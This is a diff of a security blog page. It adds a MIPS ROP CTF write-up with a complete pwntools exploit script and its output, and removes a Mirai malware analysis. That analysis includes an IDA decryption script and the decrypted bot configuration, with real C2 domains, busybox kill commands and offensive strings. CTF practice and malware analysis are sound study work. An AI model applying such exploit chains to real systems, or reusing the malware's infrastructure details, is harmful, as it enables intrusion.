@@ -168,6 +168,93 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
+    <link itemprop="mainEntityOfPage" href="https://oneshell.top/2023/03/15/write4_mipsel/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="OneShell">
+      <meta itemprop="description" content="ToT">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="OneShell">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2023/03/15/write4_mipsel/" class="post-title-link" itemprop="url">write4_mipsel</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2023-03-15 10:12:54" itemprop="dateCreated datePublished" datetime="2023-03-15T10:12:54+08:00">2023-03-15</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2023-04-11 14:03:04" itemprop="dateModified" datetime="2023-04-11T14:03:04+08:00">2023-04-11</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/PWN/" itemprop="url" rel="index"><span itemprop="name">PWN</span></a>
+                </span>
+                  , 
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/PWN/MIPSROP/" itemprop="url" rel="index"><span itemprop="name">MIPSROP</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>目的：调用print_file函数，将flag路径作为参数传递，然后打印出来。难点在于如何将flag路径布置到栈上，并且将路径字符串指针作为参数传递。<br>程序内部提供了一个usefulGadgets，应该可以分为两个gadget，第二个gadget_print是用来传递路径并执行print_file函数的。<br>第一个gadget_write的作用大概是，从栈上SP+8取出4个字节，并写入到栈上SP+4存储的地址中，最后跳转到SP+0xC继续执行，并调整栈。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">.text:00400930                               usefulGadgets:</span><br><span class="line">.text:00400930 0C 00 B9 8F                   lw      $t9, 0xC($sp)</span><br><span class="line">.text:00400934 08 00 A8 8F                   lw      $t0, 8($sp)</span><br><span class="line">.text:00400938 04 00 A9 8F                   lw      $t1, 4($sp)</span><br><span class="line">.text:0040093C 00 00 09 AD                   sw      $t1, 0($t0)</span><br><span class="line">.text:00400940 09 F8 20 03                   jalr    $t9</span><br><span class="line">.text:00400944 10 00 BD 23                   addi    $sp, 0x10</span><br><span class="line">.text:00400944</span><br><span class="line">.text:00400948 08 00 A4 8F                   lw      $a0, 8($sp)</span><br><span class="line">.text:0040094C 04 00 B9 8F                   lw      $t9, 4($sp)</span><br><span class="line">.text:00400950 09 F8 20 03                   jalr    $t9</span><br><span class="line">.text:00400954 00 00 00 00                   nop</span><br><span class="line">.text:00400954</span><br><span class="line">.text:00400958 00 00 00 00                   nop</span><br><span class="line">.text:0040095C 00 00 00 00                   nop</span><br></pre></td></tr></table></figure>
+<h2 id="ROP构造"><a href="#ROP构造" class="headerlink" title="ROP构造"></a>ROP构造</h2><p>那么ROP的思路就是：使用第一个gadget将数据写入到某个地址，最后使用第二个gadget继续执行。</p>
+<ol>
+<li>缓冲区填充<br>分析pwnme函数，ra保存在SP+0x3C，缓冲区为SP+0x18，需要填充0x24个数据才能开始覆盖<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rop = <span class="string">b&quot;A&quot;</span> * <span class="number">0x24</span></span><br></pre></td></tr></table></figure></li>
+<li>写入数据到某个地址<br>不能选择写入到栈上（或许可以其他的ROP链实现），因为写入到栈上需要额外的ROP将栈上的字符串起始地址暴露出来。此处选择程序的某个可写的Section来写入数据，这样地址完全可控。写入数据就是”flag.txt”一共8个字节，需要调用两次gadget_wirte。<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">rop += p32(gadget_write)</span><br><span class="line">rop += <span class="string">b&quot;B&quot;</span> * <span class="number">0x4</span></span><br><span class="line">rop += <span class="string">b&quot;flag&quot;</span></span><br><span class="line">rop += p32(<span class="number">0x00411000</span>)</span><br><span class="line"></span><br><span class="line">rop += p32(gadget_write)</span><br><span class="line">rop += <span class="string">b&quot;B&quot;</span> * <span class="number">0x4</span></span><br><span class="line">rop += <span class="string">b&quot;.txt&quot;</span></span><br><span class="line">rop += p32(<span class="number">0x00411004</span>)</span><br><span class="line"></span><br><span class="line">rop += (gadget_print)</span><br><span class="line">rop += <span class="string">b&quot;B&quot;</span> * <span class="number">0x4</span></span><br><span class="line">rop += p32(print_file)</span><br><span class="line">rop += p32(<span class="number">0x00411000</span>)</span><br></pre></td></tr></table></figure></li>
+</ol>
+<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">BINARY = <span class="string">&quot;./write4_mipsel&quot;</span></span><br><span class="line">ELF = ELF(BINARY)</span><br><span class="line"></span><br><span class="line">context.os = <span class="string">&quot;linux&quot;</span></span><br><span class="line">context.arch = <span class="string">&quot;mips&quot;</span></span><br><span class="line">context.binary = BINARY</span><br><span class="line"></span><br><span class="line">gadget_write = <span class="number">0x00400930</span></span><br><span class="line">gadget_print = <span class="number">0x00400948</span></span><br><span class="line">print_file = ELF.symbols[<span class="string">&#x27;print_file&#x27;</span>]</span><br><span class="line"></span><br><span class="line">rop = <span class="string">b&quot;A&quot;</span> * <span class="number">0x24</span></span><br><span class="line">rop += p32(gadget_write)</span><br><span class="line">rop += <span class="string">b&quot;B&quot;</span> * <span class="number">0x4</span></span><br><span class="line">rop += <span class="string">b&quot;flag&quot;</span></span><br><span class="line">rop += p32(<span class="number">0x00411000</span>)</span><br><span class="line"></span><br><span class="line">rop += p32(gadget_write)</span><br><span class="line">rop += <span class="string">b&quot;B&quot;</span> * <span class="number">0x4</span></span><br><span class="line">rop += <span class="string">b&quot;.txt&quot;</span></span><br><span class="line">rop += p32(<span class="number">0x00411004</span>)</span><br><span class="line"></span><br><span class="line">rop += p32(gadget_print)</span><br><span class="line">rop += <span class="string">b&quot;B&quot;</span> * <span class="number">0x4</span></span><br><span class="line">rop += p32(print_file)</span><br><span class="line">rop += p32(<span class="number">0x00411000</span>)</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;10.0.0.2&quot;</span>, <span class="number">8888</span>)</span><br><span class="line">p.sendline(rop)</span><br><span class="line"><span class="built_in">print</span>(p.recvline_contains(<span class="string">b&quot;ROPE&quot;</span>))</span><br></pre></td></tr></table></figure>
+<p>结果如下：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[*] &#x27;/home/utest/Code/mipsrop/write4_mipsel/write4_mipsel&#x27;</span><br><span class="line">    Arch:     mips-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">    RUNPATH:  b&#x27;.&#x27;</span><br><span class="line">[+] Opening connection to 10.0.0.2 on port 9999: Done</span><br><span class="line">b&#x27;ROPE&#123;a_placeholder_32byte_flag!&#125;&#x27;</span><br><span class="line">[*] Closed connection to 10.0.0.2 port 9999</span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
     <link itemprop="mainEntityOfPage" href="https://oneshell.top/2023/03/15/callme_mipsel/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1124,128 +1211,6 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
-    <link itemprop="mainEntityOfPage" href="https://oneshell.top/2023/01/12/mirai%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%EF%BC%9A%E5%AE%9E%E6%88%98%E7%9C%9F%E5%AE%9Emirai%E6%A0%B7%E6%9C%AC2-%E6%97%A0%E7%AC%A6%E5%8F%B7/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="OneShell">
-      <meta itemprop="description" content="ToT">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="OneShell">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2023/01/12/mirai%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%EF%BC%9A%E5%AE%9E%E6%88%98%E7%9C%9F%E5%AE%9Emirai%E6%A0%B7%E6%9C%AC2-%E6%97%A0%E7%AC%A6%E5%8F%B7/" class="post-title-link" itemprop="url">mirai源码分析：实战真实mirai样本2-无符号</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-
-              <time title="Created: 2023-01-12 03:12:16" itemprop="dateCreated datePublished" datetime="2023-01-12T03:12:16+08:00">2023-01-12</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2023-04-11 14:02:04" itemprop="dateModified" datetime="2023-04-11T14:02:04+08:00">2023-04-11</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">In</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Topics/" itemprop="url" rel="index"><span itemprop="name">Topics</span></a>
-                </span>
-                  , 
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Topics/mirai/" itemprop="url" rel="index"><span itemprop="name">mirai</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>此次分析的样本同样是一个发生在真实应急场景中的mirai样本，与上一个分析的样本不同，该样本去掉了符号，如果直接硬看还是很费力的。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ file ninja.mip.virus</span><br><span class="line">ninja.mip.virus: ELF 32-bit MSB executable, MIPS, MIPS-I version 1 (SYSV), statically linked, stripped</span><br></pre></td></tr></table></figure>
-<p>在分析前，同样需要明确分析的目的：提取样本中的配置信息，弱口令字典等。配置信息中通常需要重点关注CNC地址，如果有设备或者仿真执行，也可以通过抓包的方式获取，弱口令字典需要看样本中是否包含了爆破模块。在此次的样本中，并没有弱口令扫描的模块，因此把重心放在了配置信息提取上。</p>
-<h2 id="样本分析思路"><a href="#样本分析思路" class="headerlink" title="样本分析思路"></a>样本分析思路</h2><p>一般情况下，mirai都是使用了xor的方式来对配置信息进行加解密。在mirai源码中，配置信息在函数<code>table_init</code>中通过调用函数<code>add_entry</code>将硬编码且加密的数据逐条添加到<code>table</code>结构体中。在bot需要使用到相应的数据时，通过函数<code>table_unlock_val</code>将对应条目的<code>table</code>解密，等到使用完毕后，再调用<code>table_lock_val</code>重新将<code>table</code>中的条目进行加密。具体的代码实现逻辑可以参考上一个分析带符号的mirai文章，以及之前的mirai bot源码分析。</p>
-<p>那么可以总结出如下的信息：</p>
-<ol>
-<li>样本中可得配置信息：加密后的配置信息是以硬编码的形式在样本中。</li>
-<li>加解密函数可定位：样本通常使用xor的方式进行加密，在样本中搜索对应架构的xor指令可以定位加解密函数（理论上还可以采用其他的加解密方式）。</li>
-<li>加解密函数使用特征：样本在使用配置信息前后，会依次调用解密函数<code>table_unlock_val</code>和加密函数<code>table_lock_val</code>。</li>
-</ol>
-<p>因此，对该样本进行分析的思路就是：</p>
-<ol>
-<li>寻找样本中所有使用到xor的函数，判断是否涉及到加解密操作。</li>
-<li>寻找到加解密函数后，根据在样本中的交叉引用，确定加解密函数。</li>
-<li>定位样本配置信息初始化的函数<code>table_init</code>。</li>
-<li>定位样本中的 <code>add_entry</code>函数获取到加密后的配置信息，并根据解密函数逻辑进行解密。</li>
-</ol>
-<h2 id="定位和确认加解密函数"><a href="#定位和确认加解密函数" class="headerlink" title="定位和确认加解密函数"></a>定位和确认加解密函数</h2><p>在IDA中搜索所有的MIPS xor指令，通过简单分析，得到如下的三个函数可能是加解密相关函数：</p>
-<ul>
-<li>sub_409DCB</li>
-<li>sub_40A6F8</li>
-<li>sub_40A7DC<br>其中sub_40A6F8和sub_40A7DC的逻辑基本相同，且xor操作都使用到了敏感数据：0xDEADBEEF，因此可以判断这两个函数极大可能是加解密函数。<br>三个函数的反编译结果如下：<br>sub_409DCB<br><img src="/images/Pastedimage20230112162201.png" alt="undifined"><br>sub_40A6F8<br><img src="/images/Pastedimage20230112162316.png" alt="undifined"><br>sub_40A7DC<br><img src="/images/Pastedimage20230112162430.png" alt="undifined"></li>
-</ul>
-<p>在文章开头也提到过，mirai使用<code>table</code>中的结构体有一个特征：那就是先使用函数<code>table_unlock_val</code>将对应<code>table_id</code>的条目解密，使用完毕后再使用函数<code>table_lock_val</code>加密。因此，可以通过查看如上三个函数的交叉引用，查看是否有相似的匹配特征。最终确定了：</p>
-<ul>
-<li>sub_40A7DC &#x3D; <code>table_unlock_val</code></li>
-<li>sub_40A6F8 &#x3D; <code>table_lock_val</code><br>如下是一个典型的mirai bot使用数据的特征：<br><img src="/images/Pastedimage20230116151913.png" alt="undifined"></li>
-</ul>
-<h2 id="定位配置信息初始化函数table-init"><a href="#定位配置信息初始化函数table-init" class="headerlink" title="定位配置信息初始化函数table_init"></a>定位配置信息初始化函数table_init</h2><p>mirai bot的配置信息例如C2等在函数<code>table_init</code>中进行初始化，攻击配置例如弱口令字典是在函数<code>attack_init</code>中进行初始化。在此处关注的是对配置信息的提取。</p>
-<p>在无符号样本中寻找<code>table_init</code>的思路是：</p>
-<ol>
-<li>根据函数<code>table_lock_val</code>或者其他函数寻找到全局变量<code>table</code></li>
-<li>根据全局变量<code>table</code>的交叉引用，来寻找函数<code>table_init</code></li>
-</ol>
-<p>在函数<code>table_lock_val</code>中，传入配置<code>table_id</code>，来对<code>table</code>进行数据的操作：<br><img src="/images/Pastedimage20230116152853.png" alt="undifined"></p>
-<p>继续查看<code>table</code>的交叉引用，最后定位到<code>table_init</code>。在<code>table_init</code>中会多次将硬编码的配置信息存入到<code>table</code>中，因此特征很明显。如下是交叉引用（已经恢复部分符号）以及<code>table_init</code>中进行初始化配置：<br><img src="/images/Pastedimage20230116153046.png" alt="undifined"><br><img src="/images/Pastedimage20230116153221.png" alt="undifined"></p>
-<h2 id="解密脚本编写"><a href="#解密脚本编写" class="headerlink" title="解密脚本编写"></a>解密脚本编写</h2><p>那么编写解密函数的思路也很简单了：</p>
-<ol>
-<li>在函数<code>table_init</code>中分析<code>util_memcpy</code>（手动恢复的符号）使用到的硬编码加密数据和数据长度。</li>
-<li>根据函数<code>table_unlock_val</code>的解密逻辑对数据进行解密</li>
-</ol>
-<p><code>table_unlock_val</code>的反编译逻辑如下，实则非常简单，就是使用了mirai的默认加密算法：数据的每个字节逐个和0xdeadbeef进行异或。<br><img src="/images/Pastedimage20230116173128.png" alt="undifined"><br>解密脚本如下：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> idc</span><br><span class="line"><span class="keyword">import</span> idautils</span><br><span class="line"></span><br><span class="line">ea = idc.get_name_ea_simple(<span class="string">&quot;util_memcpy&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># table_init范围内</span></span><br><span class="line">start = <span class="number">0x0040A8C0</span></span><br><span class="line">end = <span class="number">0x0040BD0C</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 根据MIPS传参规则，分析util_memcpy中的待解密数据地址</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_args</span>(<span class="params">addr</span>):</span><br><span class="line">    each_op = addr + <span class="number">4</span></span><br><span class="line">    tmp_args = &#123;</span><br><span class="line">        <span class="string">&quot;A1&quot;</span> : <span class="number">0</span>,</span><br><span class="line">        <span class="string">&quot;A2&quot;</span> : <span class="number">0</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> each_op &gt;= start:</span><br><span class="line">        op_disasm = idc.GetDisasm(each_op).upper()</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;ADDIU&quot;</span> <span class="keyword">in</span> op_disasm <span class="keyword">and</span> <span class="string">&quot;A1&quot;</span> <span class="keyword">in</span> op_disasm:</span><br><span class="line">            tmp_args[<span class="string">&quot;A1&quot;</span>] = each_op</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;LI&quot;</span> <span class="keyword">in</span> op_disasm <span class="keyword">and</span> <span class="string">&quot;A2&quot;</span> <span class="keyword">in</span> op_disasm:</span><br><span class="line">            tmp_args[<span class="string">&quot;A2&quot;</span>] = each_op</span><br><span class="line">        <span class="keyword">if</span> tmp_args[<span class="string">&quot;A1&quot;</span>] != <span class="number">0</span> <span class="keyword">and</span> tmp_args[<span class="string">&quot;A2&quot;</span>] != <span class="number">0</span>:</span><br><span class="line">            <span class="comment"># print(hex(tmp_args[&quot;A1&quot;]), hex(tmp_args[&quot;A2&quot;]))</span></span><br><span class="line">            <span class="keyword">return</span> tmp_args</span><br><span class="line">        each_op = idc.prev_head(each_op)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 根据地址获取待解密数据</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_op_string</span>(<span class="params">addr</span>):</span><br><span class="line">    str_addr_list = <span class="built_in">list</span>(idautils.DataRefsFrom(addr))</span><br><span class="line">    <span class="comment"># print(str_addr_list)</span></span><br><span class="line">    data = []</span><br><span class="line">    start = str_addr_list[<span class="number">0</span>]</span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        byte = idc.get_wide_byte(start + i)</span><br><span class="line">        <span class="keyword">if</span> byte == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        data.append(byte)</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">    <span class="comment"># print(&quot;0x%x&quot; % start, data)</span></span><br><span class="line">    <span class="keyword">return</span> data, i</span><br><span class="line"></span><br><span class="line"><span class="comment"># 读取硬编码的table_keys</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">init_key</span>():</span><br><span class="line">    addr = <span class="number">0x00451034</span></span><br><span class="line">    key = []</span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        byte = idc.get_wide_byte(addr + i)</span><br><span class="line">        <span class="keyword">if</span> byte == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        key.append(byte)</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> key, i</span><br><span class="line"></span><br><span class="line"><span class="comment"># 真正的解密函数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">data, key</span>):</span><br><span class="line">    key1 = key[<span class="number">0</span>]</span><br><span class="line">    key2 = key[<span class="number">1</span>]</span><br><span class="line">    key3 = key[<span class="number">2</span>]</span><br><span class="line">    key4 = key[<span class="number">3</span>]</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(data)):</span><br><span class="line">        data[j] ^= key1</span><br><span class="line">        data[j] ^= key2</span><br><span class="line">        data[j] ^= key3</span><br><span class="line">        data[j] ^= key4</span><br><span class="line">    result = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> each <span class="keyword">in</span> data:</span><br><span class="line">        result += <span class="built_in">chr</span>(each)</span><br><span class="line">    <span class="built_in">print</span>(result)</span><br><span class="line">   </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    key, key_len = init_key()</span><br><span class="line">    <span class="comment"># 获取util_memcpy的交叉引用</span></span><br><span class="line">    <span class="keyword">for</span> addr <span class="keyword">in</span> idautils.CodeRefsTo(ea, <span class="number">0</span>):</span><br><span class="line">        <span class="keyword">if</span> start &lt;= addr &lt; end:</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;JA&quot;</span> <span class="keyword">in</span> idc.GetDisasm(addr).upper():</span><br><span class="line">                args = find_args(addr)</span><br><span class="line">                arg1, arg_len = get_op_string(args[<span class="string">&quot;A1&quot;</span>])</span><br><span class="line">                <span class="comment"># print(arg1, arg_len)</span></span><br><span class="line">                encrypt(arg1, key)</span><br><span class="line"></span><br><span class="line">main()</span><br></pre></td></tr></table></figure>
-<p>解密结果如下（不打码），可以看到其中的C2：<code>king.badplayer.net</code>和<code>sc.badplayer.net</code></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line">king.badplayer.net</span><br><span class="line">ï2</span><br><span class="line">sc.badplayer.net</span><br><span class="line">ï3</span><br><span class="line">lzrd cock fest</span><br><span class="line">/proc/</span><br><span class="line">/exe</span><br><span class="line"> (deleted)</span><br><span class="line">/fd</span><br><span class="line">.anime</span><br><span class="line">/status</span><br><span class="line">dvrHelper</span><br><span class="line">NiGGeR69xd</span><br><span class="line">1337SoraLOADER</span><br><span class="line">NiGGeRd0nks1337</span><br><span class="line">X19I239124UIU</span><br><span class="line">IuYgujeIqn</span><br><span class="line">14Fa</span><br><span class="line">ccAD</span><br><span class="line">/proc/net/route</span><br><span class="line">/proc/cpuinfo</span><br><span class="line">BOGOMIPS</span><br><span class="line">/etc/rc.d/rc.local</span><br><span class="line">g1abc4dmo35hnp2lie0kjf</span><br><span class="line">/dev/watchdog</span><br><span class="line">/dev/misc/watchdog</span><br><span class="line">/dev/FTWDT101_watchdog</span><br><span class="line">/dev/netslink/</span><br><span class="line">PRIVMSG</span><br><span class="line">GETLOCALIP</span><br><span class="line">KILLATTK</span><br><span class="line">Eats8</span><br><span class="line">v[0v</span><br><span class="line">93OfjHZ2z</span><br><span class="line">GhostWuzHere666</span><br><span class="line">WsGA4@F6F</span><br><span class="line">ACDB</span><br><span class="line">AbAd</span><br><span class="line">iaGv</span><br><span class="line">shell</span><br><span class="line">enable</span><br><span class="line">system</span><br><span class="line">sh</span><br><span class="line">/bin/busybox LZRD</span><br><span class="line">LZRD: applet not found</span><br><span class="line">ncorrect</span><br><span class="line">/bin/busybox ps</span><br><span class="line">/bin/busybox kill -9 </span><br><span class="line">TSource Engine Query</span><br><span class="line">/etc/resolv.conf</span><br><span class="line">nameserver </span><br><span class="line">Connection: keep-alive</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: en-US,en;q=0.8</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">setCookie(&#x27;</span><br><span class="line">refresh:</span><br><span class="line">location:</span><br><span class="line">set-cookie:</span><br><span class="line">content-length:</span><br><span class="line">transfer-encoding:</span><br><span class="line">chunked</span><br><span class="line">keep-alive</span><br><span class="line">connection:</span><br><span class="line">server: dosarrest</span><br><span class="line">server: cloudflare-nginx</span><br><span class="line">Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 